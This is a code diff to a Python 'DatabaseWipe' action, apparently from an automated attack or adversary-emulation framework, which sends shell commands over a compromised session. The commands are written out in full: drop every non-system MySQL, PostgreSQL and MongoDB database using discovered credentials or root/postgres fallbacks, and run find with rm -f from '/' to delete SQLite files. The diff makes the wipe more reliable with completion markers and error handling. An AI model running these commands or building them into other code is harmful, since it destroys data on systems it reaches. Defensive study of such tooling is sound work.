@@ -1,4 +1,6 @@
 
+import time
+
 from action_state_interface.action import Action, StateChangeSequence
 from action_state_interface.exec import ActionExecutionResult
 from artefacts.ArtefactManager import ArtefactManager
@@ -154,7 +156,7 @@ class DatabaseWipe(Action):
         asset_ip = pattern.get('asset').get('ip_address')
         db_service = pattern.get('db_service')
         service_protocol = db_service.get('protocol')
-        session = pattern.get('session')._id
+        session = pattern.get('session').get('id')
         credentials = pattern.get('credentials')
         username = credentials.get('username') if credentials else 'default'
         session_service = pattern.get('session_service')
@@ -194,6 +196,9 @@ class DatabaseWipe(Action):
             self.input_motif.get_template('existing_user').entity.username ==
             self.input_motif.get_template('existing_credentials').entity.username
         )
+        query.where(
+            self.input_motif.get_template('existing_db_service').entity.wiped.is_null()
+        )
         query.ret_all()
         return query
 
@@ -209,7 +214,7 @@ class DatabaseWipe(Action):
             Shell command string to find and remove database files
         """
         paths_str = " ".join(search_paths)
-        return f"""find {paths_str} -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | while read db; do rm -f "$db" && echo "{message_prefix}: $db"; done"""
+        return f"""find {paths_str} \\( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" \\) 2>/dev/null | while read db; do rm -f "$db" && echo "{message_prefix}: $db"; done"""
 
     def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
         """
@@ -219,10 +224,13 @@ class DatabaseWipe(Action):
         1. Detecting database type from service protocol
         2. Executing appropriate DROP DATABASE commands for all databases
         3. For SQLite, removing all database files
+        
+        Returns ActionExecutionResult with detailed output including error messages.
         """
         tulpa_session = pattern.get('session')
         tulpa_session_id = tulpa_session.get('id')
         live_session = sessions.get_session(tulpa_session_id)
+        
         db_service = pattern.get('db_service')
         service_protocol = db_service.get('protocol').lower() if db_service and db_service.get('protocol') else ''
         credentials = pattern.get('credentials')
@@ -231,61 +239,183 @@ class DatabaseWipe(Action):
         
         commands_executed = []
         output_lines = []
+        output_lines.append(f"Attempting to wipe {service_protocol.upper()} databases...")
         
-        # MySQL/MariaDB database wiping - drop all databases (excluding system databases)
         if service_protocol in ['mysql', 'mariadb']:
-            # Use discovered credentials or fallback to root
             db_user = username if username else 'root'
+            output_lines.append(f"Connecting to MySQL/MariaDB as user: {db_user}")
+            
             if password:
-                mysql_cmd = f"""mysql -u {db_user} -p'{password}' -e "SHOW DATABASES;" 2>/dev/null | grep -v -E '^(Database|information_schema|mysql|performance_schema|sys)$' | while read db; do mysql -u {db_user} -p'{password}' -e "DROP DATABASE IF EXISTS \\`$db\\`;" 2>/dev/null; echo "Dropped database: $db"; done"""
+                mysql_cmd = f"mysql -u {db_user} -p'{password}' -e \"SHOW DATABASES;\" 2>&1 | grep -v -E '^(Database|information_schema|mysql|performance_schema|sys)$' | while read db; do mysql -u {db_user} -p'{password}' -e \"DROP DATABASE IF EXISTS \\`$db\\`;\" 2>&1 && echo \"Dropped database: $db\" || echo \"ERROR: Failed to drop database: $db\"; done; echo \"DATABASE_WIPE_COMPLETE_MYSQL\""
             else:
-                mysql_cmd = f"""mysql -u {db_user} -e "SHOW DATABASES;" 2>/dev/null | grep -v -E '^(Database|information_schema|mysql|performance_schema|sys)$' | while read db; do mysql -u {db_user} -e "DROP DATABASE IF EXISTS \\`$db\\`;" 2>/dev/null; echo "Dropped database: $db"; done"""
-            output = live_session.run_command(mysql_cmd)
-            commands_executed.append(mysql_cmd)
-            output_lines.append(output)
+                mysql_cmd = f"mysql -u {db_user} -e \"SHOW DATABASES;\" 2>&1 | grep -v -E '^(Database|information_schema|mysql|performance_schema|sys)$' | while read db; do mysql -u {db_user} -e \"DROP DATABASE IF EXISTS \\`$db\\`;\" 2>&1 && echo \"Dropped database: $db\" || echo \"ERROR: Failed to drop database: $db\"; done; echo \"DATABASE_WIPE_COMPLETE_MYSQL\""
+            try:
+                channel = live_session.get_session_object()
+                if channel:
+                    channel.send(mysql_cmd + "\n")
+                    commands_executed.append(mysql_cmd)
+                    
+                    completion_marker = "DATABASE_WIPE_COMPLETE_MYSQL"
+                    output = []
+                    start_time = time.time()
+                    timeout = 15.0
+                    
+                    channel.settimeout(0.1)
+                    
+                    while time.time() - start_time < timeout:
+                        try:
+                            data = channel.recv(4096).decode('utf-8', errors='ignore')
+                            if data:
+                                output.append(data)
+                                output_str = ''.join(output)
+                                if f'\n{completion_marker}\n' in output_str or \
+                                   output_str.endswith(f'\n{completion_marker}') or \
+                                   output_str.startswith(f'{completion_marker}\n'):
+                                    break
+                        except:
+                            time.sleep(0.1)
+                            continue
+                    
+                    channel.settimeout(None)
+                    output_str = ''.join(output).replace("\r", "")
+                    output_lines.append(output_str)
+                else:
+                    output = live_session.run_command(mysql_cmd)
+                    commands_executed.append(mysql_cmd)
+                    output_lines.append(output)
+            except Exception as e:
+                output_lines.append(f"ERROR: Session closed or command failed: {str(e)}")
+                return ActionExecutionResult(
+                    command=[mysql_cmd],
+                    stdout="\n".join(output_lines),
+                    exit_status=1,
+                    session=tulpa_session_id
+                )
         
-        # PostgreSQL database wiping - drop all databases (excluding system databases)
         elif service_protocol == 'postgresql':
-            # Use discovered credentials or fallback to postgres
             db_user = username if username else 'postgres'
+            output_lines.append(f"Connecting to PostgreSQL as user: {db_user}")
+            
             if password:
-                # Set PGPASSWORD environment variable for password authentication
-                psql_cmd = f"""PGPASSWORD='{password}' psql -U {db_user} -lqt 2>/dev/null | cut -d \\| -f 1 | grep -v -E '^(template|postgres|Name)$' | sed 's/^[[:space:]]*//' | sed 's/[[:space:]]*$//' | while read db; do [ -n "$db" ] && PGPASSWORD='{password}' psql -U {db_user} -c "DROP DATABASE IF EXISTS \\"$db\\";" 2>/dev/null && echo "Dropped database: $db"; done"""
+                psql_cmd = f"PGPASSWORD='{password}' psql -h localhost -U {db_user} -lqt 2>&1 | cut -d \\| -f 1 | sed 's/^[[:space:]]*//' | sed 's/[[:space:]]*$//' | grep -v -E '^(template0|template1|postgres|Name)$' | while read db; do [ -n \"$db\" ] && (PGPASSWORD='{password}' psql -h localhost -U {db_user} -c \"DROP DATABASE IF EXISTS \\\"$db\\\";\" 2>&1 && echo \"Dropped database: $db\" || echo \"ERROR: Failed to drop database: $db\"); done; echo \"DATABASE_WIPE_COMPLETE_POSTGRES\""
             else:
-                psql_cmd = f"""psql -U {db_user} -lqt 2>/dev/null | cut -d \\| -f 1 | grep -v -E '^(template|postgres|Name)$' | sed 's/^[[:space:]]*//' | sed 's/[[:space:]]*$//' | while read db; do [ -n "$db" ] && psql -U {db_user} -c "DROP DATABASE IF EXISTS \\"$db\\";" 2>/dev/null && echo "Dropped database: $db"; done"""
-            output = live_session.run_command(psql_cmd)
-            commands_executed.append(psql_cmd)
-            output_lines.append(output)
+                psql_cmd = f"psql -h localhost -U {db_user} -lqt 2>&1 | cut -d \\| -f 1 | sed 's/^[[:space:]]*//' | sed 's/[[:space:]]*$//' | grep -v -E '^(template0|template1|postgres|Name)$' | while read db; do [ -n \"$db\" ] && (psql -h localhost -U {db_user} -c \"DROP DATABASE IF EXISTS \\\"$db\\\";\" 2>&1 && echo \"Dropped database: $db\" || echo \"ERROR: Failed to drop database: $db\"); done; echo \"DATABASE_WIPE_COMPLETE_POSTGRES\""
+            try:
+                channel = live_session.get_session_object()
+                if channel:
+                    channel.send(psql_cmd + "\n")
+                    commands_executed.append(psql_cmd)
+                    
+                    completion_marker = "DATABASE_WIPE_COMPLETE_POSTGRES"
+                    output = []
+                    start_time = time.time()
+                    timeout = 15.0
+                    
+                    channel.settimeout(0.1)
+                    
+                    while time.time() - start_time < timeout:
+                        try:
+                            data = channel.recv(4096).decode('utf-8', errors='ignore')
+                            if data:
+                                output.append(data)
+                                output_str = ''.join(output)
+                                if f'\n{completion_marker}\n' in output_str or \
+                                   output_str.endswith(f'\n{completion_marker}') or \
+                                   output_str.startswith(f'{completion_marker}\n'):
+                                    break
+                        except:
+                            time.sleep(0.1)
+                            continue
+                    
+                    channel.settimeout(None)
+                    output_str = ''.join(output).replace("\r", "")
+                    output_lines.append(output_str)
+                else:
+                    output = live_session.run_command(psql_cmd)
+                    commands_executed.append(psql_cmd)
+                    output_lines.append(output)
+            except Exception as e:
+                output_lines.append(f"ERROR: Session closed or command failed: {str(e)}")
+                return ActionExecutionResult(
+                    command=[psql_cmd],
+                    stdout="\n".join(output_lines),
+                    exit_status=1,
+                    session=tulpa_session_id
+                )
         
-        # MongoDB database wiping - drop all databases except admin, config, and local
         elif service_protocol == 'mongodb':
-            # Use discovered credentials or connect without auth
+            output_lines.append(f"Connecting to MongoDB as user: {username if username else 'anonymous'}")
+            
             if username and password:
-                mongo_cmd = f"""mongo --quiet -u {username} -p '{password}' --authenticationDatabase admin --eval "db.adminCommand('listDatabases').databases.forEach(function(d){{if(!['admin','config','local'].includes(d.name)){{db.getSiblingDB(d.name).dropDatabase();print('Dropped database: '+d.name);}}}})" 2>/dev/null"""
+                mongo_cmd = f"""mongo --quiet -u {username} -p '{password}' --authenticationDatabase admin --eval "db.adminCommand('listDatabases').databases.forEach(function(d){{if(!['admin','config','local'].includes(d.name)){{db.getSiblingDB(d.name).dropDatabase();print('Dropped database: '+d.name);}}}})" 2>&1"""
             elif username:
-                mongo_cmd = f"""mongo --quiet -u {username} --eval "db.adminCommand('listDatabases').databases.forEach(function(d){{if(!['admin','config','local'].includes(d.name)){{db.getSiblingDB(d.name).dropDatabase();print('Dropped database: '+d.name);}}}})" 2>/dev/null"""
+                mongo_cmd = f"""mongo --quiet -u {username} --eval "db.adminCommand('listDatabases').databases.forEach(function(d){{if(!['admin','config','local'].includes(d.name)){{db.getSiblingDB(d.name).dropDatabase();print('Dropped database: '+d.name);}}}})" 2>&1"""
             else:
-                mongo_cmd = """mongo --quiet --eval "db.adminCommand('listDatabases').databases.forEach(function(d){if(!['admin','config','local'].includes(d.name)){db.getSiblingDB(d.name).dropDatabase();print('Dropped database: '+d.name);}})" 2>/dev/null"""
-            output = live_session.run_command(mongo_cmd)
-            commands_executed.append(mongo_cmd)
-            output_lines.append(output)
+                mongo_cmd = """mongo --quiet --eval "db.adminCommand('listDatabases').databases.forEach(function(d){if(!['admin','config','local'].includes(d.name)){db.getSiblingDB(d.name).dropDatabase();print('Dropped database: '+d.name);}})" 2>&1"""
+            try:
+                output = live_session.run_command(mongo_cmd)
+                commands_executed.append(mongo_cmd)
+                for line in output.split('\n'):
+                    if line.strip():
+                        output_lines.append(line)
+            except Exception as e:
+                output_lines.append(f"ERROR: Session closed or command failed: {str(e)}")
+                return ActionExecutionResult(
+                    command=[mongo_cmd],
+                    stdout="\n".join(output_lines),
+                    exit_status=1,
+                    session=tulpa_session_id
+                )
         
-        # SQLite database wiping (find and remove all .db files)
         elif service_protocol == 'sqlite':
+            output_lines.append("Searching for SQLite database files...")
             sqlite_cmd = self._build_file_based_wipe_cmd(['/'], "Removed database")
-            output = live_session.run_command(sqlite_cmd)
-            commands_executed.append(sqlite_cmd)
-            output_lines.append(output)
+            try:
+                output = live_session.run_command(sqlite_cmd)
+                commands_executed.append(sqlite_cmd)
+                for line in output.split('\n'):
+                    if line.strip():
+                        output_lines.append(line)
+            except Exception as e:
+                output_lines.append(f"ERROR: Session closed or command failed: {str(e)}")
+                return ActionExecutionResult(
+                    command=[sqlite_cmd],
+                    stdout="\n".join(output_lines),
+                    exit_status=1,
+                    session=tulpa_session_id
+                )
         
-        # Generic fallback: try to find and remove common database files
         else:
+            output_lines.append(f"Unknown database type '{service_protocol}', attempting generic file-based wipe...")
             generic_cmd = self._build_file_based_wipe_cmd(['/var/lib', '/opt', '/usr/local'], "Removed database file")
-            output = live_session.run_command(generic_cmd)
-            commands_executed.append(generic_cmd)
-            output_lines.append(output)
+            try:
+                output = live_session.run_command(generic_cmd)
+                commands_executed.append(generic_cmd)
+                for line in output.split('\n'):
+                    if line.strip():
+                        output_lines.append(line)
+            except Exception as e:
+                output_lines.append(f"ERROR: Session closed or command failed: {str(e)}")
+                return ActionExecutionResult(
+                    command=[generic_cmd],
+                    stdout="\n".join(output_lines),
+                    exit_status=1,
+                    session=tulpa_session_id
+                )
+        
+        all_lines = []
+        for output_item in output_lines:
+            all_lines.extend(output_item.split('\n'))
+        
+        has_success = any(line.strip().startswith("Dropped database:") for line in all_lines)
+        exit_status = 0 if has_success else 1
+        
+        if has_success:
+            output_lines.append("SUCCESS: Databases were successfully wiped")
+        else:
+            output_lines.append("FAILED: No databases were wiped")
         
         stdout = "\n".join(output_lines) if output_lines else "No databases found or wiped"
-        exit_status = 0 if output_lines and any("Dropped" in line or "Removed" in line for line in output_lines) else 1
         
         return ActionExecutionResult(
             command=commands_executed,
@@ -295,55 +425,17 @@ class DatabaseWipe(Action):
         )
 
     def parse_output(self, output: ActionExecutionResult) -> dict:
-        """
-        Parse the output of the DatabaseWipe action.
-        Extracts which databases were wiped from the command output.
-        """
-        wiped_databases = []
-        wiped = False
-        lines = output.stdout.split("\n")
-        
-        for line in lines:
-            # Extract database names that were wiped
-            if "Dropped database:" in line:
-                # Format: "Dropped database: database_name"
-                parts = line.split("Dropped database:")
-                if len(parts) > 1:
-                    db_name = parts[1].strip()
-                    if db_name:
-                        wiped_databases.append(db_name)
-                        wiped = True
-            elif "Removed database:" in line or "Removed database file:" in line:
-                # Format: "Removed database: /path/to/database.db"
-                parts = line.split(":")
-                if len(parts) > 1:
-                    db_path = parts[1].strip()
-                    # Extract just the filename as the database name
-                    db_name = db_path.split('/')[-1] if '/' in db_path else db_path
-                    if db_name:
-                        wiped_databases.append(db_name)
-                        wiped = True
-        
-        return {
-            "wiped": wiped,
-            "success": output.exit_status == 0 and wiped,
-            "wiped_databases": wiped_databases
-        }
+        has_success_message = any(line.strip().startswith("Dropped database:") for line in output.stdout.split("\n"))
+        success = has_success_message and output.exit_status == 0
+        return {"success": success, "wiped": success}
 
     def populate_output_motif(self, pattern: Pattern, discovered_data: dict) -> StateChangeSequence:
-        """
-        Populate the output motif for DatabaseWipe.
-        
-        Updates the database service to mark it as wiped when the wipe operation was successful.
-        """
         self.output_motif.reset_context()
         changes: StateChangeSequence = []
         
-        # If wipe was successful, mark the database service as wiped
-        if discovered_data.get("success"):
+        if discovered_data.get("success") is True:
             db_service = pattern.get("db_service")
             if db_service:
-                # Use the output motif template to update the service with wiped=true
                 service_change = self.output_motif.instantiate(
                     template_name="wiped_db_service",
                     match_on_override=db_service,
